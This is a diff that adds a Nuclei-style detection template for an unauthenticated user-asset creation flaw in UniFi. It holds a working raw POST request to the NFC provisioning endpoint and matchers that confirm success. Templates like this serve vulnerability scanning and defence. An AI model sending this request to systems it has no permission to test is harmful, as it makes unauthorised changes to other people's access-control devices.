@@ -1,0 +1,44 @@
+id: unifi-create-user
+
+info:
+  name: UniFi - Unauthenticated Creation Access For Users
+  author: DhiyaneshDk
+  severity: high
+  description: |
+    The /api/v1/user_assets/nfc endpoint accepts unauthenticated POST requests with NFC provisioning data (e.g., alias, asset_id, nfc_id, tokens) and returns {"code":"CODE_SUCCESS"} over HTTP, confirming backend processing without any authentication or session validation.
+  reference:
+    - https://www.catchify.sa/post/cve-2025-52665-rce-in-unifi-os-25-000
+  metadata:
+    verified: true
+    max-request: 1
+  tags: unifi,unauth,vuln
+
+variables:
+  rand_string: '{{to_lower(rand_text_alpha(6))}}'
+
+http:
+  - raw:
+      - |
+        POST /api/v1/user_assets/nfc HTTP/1.1
+        Host: {{Hostname}}:9780
+        Content-Type: application/json
+
+        {
+          "alias": "{{rand_string}}",
+          "asset_id": "1",
+          "need_provision": true,
+          "nfc_id": "1",
+          "plain_token": "1",
+          "sys_id": "1",
+          "token": "1",
+          "ua_card_id": "1",
+          "ua_card_pub_key": "1"
+        }
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains_all(body,"CODE_SUCCESS",'code')'
+          - 'contains(content_type, "application/json")'
+          - 'status_code == 200'
+        condition: and
